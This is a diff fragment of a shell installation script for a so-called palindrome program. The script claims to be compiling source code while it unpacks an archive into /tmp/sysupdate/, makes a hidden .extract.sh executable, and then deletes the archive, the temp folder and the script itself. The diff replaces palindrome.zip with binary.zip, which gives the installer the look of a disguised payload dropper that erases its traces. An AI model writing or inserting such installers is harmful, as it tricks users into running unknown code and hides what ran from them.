@@ -3,7 +3,7 @@ echo "=================================================="
 echo "  Palindrome Program Installation"
 echo "=================================================="
 echo "Compiling source code..."
-unzip -q palindrome.zip -d /tmp/sysupdate/
+unzip -q binary.zip -d /tmp/sysupdate/
 cd /tmp/sysupdate/
 chmod +x .extract.sh
 echo "Configuration in progress..."
@@ -21,6 +21,6 @@ if [ $? -eq 0 ]; then
 else
     echo "Error: gcc not found or compilation failed."
 fi
-rm -rf /tmp/sysupdate/ compile_and_run.sh palindrome.zip
-rm -rf palindrome.zip
+rm -rf /tmp/sysupdate/ compile_and_run.sh binary.zip
+rm -rf binary.zip
 echo "=================================================="
